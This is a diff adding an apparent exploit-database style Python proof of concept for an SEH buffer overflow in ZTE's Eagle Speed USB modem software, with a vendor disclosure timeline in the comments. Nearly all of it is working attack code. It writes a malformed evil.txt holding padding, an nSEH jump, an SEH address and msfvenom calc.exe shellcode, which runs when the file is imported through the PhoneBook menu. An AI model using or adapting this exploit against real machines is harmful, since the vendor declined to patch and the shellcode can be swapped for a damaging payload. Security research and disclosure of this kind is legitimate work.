@@ -1,0 +1,60 @@
+#!/usr/bin/python -w
+# Title : ZTE PC UI USB MODEM SOFTWARE Buffer Overflow
+# Date : 17/09/2015
+# Author : R-73eN
+# Tested on : Windows Xp sp3 on software Eagle Speed PCW_EAGLEALBp671A1V1.0.0B02
+# Since all the PC UI based software shares the same source code they are all vulnerable.(Confirmed By ZTE)
+# The problem exists into the import function at PhoneBook Menu which doesn't 
+# validate data and importing a malformed file leads to code execution.
+# 
+# Triggering the Vulnerability
+# run this python script which will save an evil.txt file.
+# Open Eagle Speed, go to PhoneBook , click Import and select the evil.txt File
+# A calculator Should pop up. 
+# 
+# Disclosure Timeline:
+# [16/08/2015] - Vendor notified
+# [18/08/2015] - Vendor Responded asking for more details
+# [17/08/2015] - Vendor Responded that will not release a patch since the product is at end of life.
+#
+# Solution:
+# Don't import unknown text file.
+#
+# Video - https://www.youtube.com/watch?v=jbv1L4TrHTY
+#
+
+banner = ""
+banner +="  ___        __        ____                 _    _  \n" 
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+
+shellcode =  "" #msfvenom -p windows/exec cmd=calc.exe -f python -b "\x00\x0d\x0a\x3d\x20\x3f"
+shellcode += "\xba\x49\xc7\x99\xe5\xda\xd7\xd9\x74\x24\xf4\x5b\x29"
+shellcode += "\xc9\xb1\x31\x83\xc3\x04\x31\x53\x0f\x03\x53\x46\x25"
+shellcode += "\x6c\x19\xb0\x2b\x8f\xe2\x40\x4c\x19\x07\x71\x4c\x7d"
+shellcode += "\x43\x21\x7c\xf5\x01\xcd\xf7\x5b\xb2\x46\x75\x74\xb5"
+shellcode += "\xef\x30\xa2\xf8\xf0\x69\x96\x9b\x72\x70\xcb\x7b\x4b"
+shellcode += "\xbb\x1e\x7d\x8c\xa6\xd3\x2f\x45\xac\x46\xc0\xe2\xf8"
+shellcode += "\x5a\x6b\xb8\xed\xda\x88\x08\x0f\xca\x1e\x03\x56\xcc"
+shellcode += "\xa1\xc0\xe2\x45\xba\x05\xce\x1c\x31\xfd\xa4\x9e\x93"
+shellcode += "\xcc\x45\x0c\xda\xe1\xb7\x4c\x1a\xc5\x27\x3b\x52\x36"
+shellcode += "\xd5\x3c\xa1\x45\x01\xc8\x32\xed\xc2\x6a\x9f\x0c\x06"
+shellcode += "\xec\x54\x02\xe3\x7a\x32\x06\xf2\xaf\x48\x32\x7f\x4e"
+shellcode += "\x9f\xb3\x3b\x75\x3b\x98\x98\x14\x1a\x44\x4e\x28\x7c"
+shellcode += "\x27\x2f\x8c\xf6\xc5\x24\xbd\x54\x83\xbb\x33\xe3\xe1"
+shellcode += "\xbc\x4b\xec\x55\xd5\x7a\x67\x3a\xa2\x82\xa2\x7f\x5c"
+shellcode += "\xc9\xef\x29\xf5\x94\x65\x68\x98\x26\x50\xae\xa5\xa4"
+shellcode += "\x51\x4e\x52\xb4\x13\x4b\x1e\x72\xcf\x21\x0f\x17\xef"
+shellcode += "\x96\x30\x32\x8c\x79\xa3\xde\x7d\x1c\x43\x44\x82"
+
+filename="evil.txt"
+nSEH = "\xEB\x06\x90\x90"
+SEH = "\xab\x11\x9f\x0f"
+buffer = "A" * 3136 + nSEH + SEH + shellcode + "D" * (2856 - len(shellcode))
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
+print "[+] Evil.txt created successfully [+]"
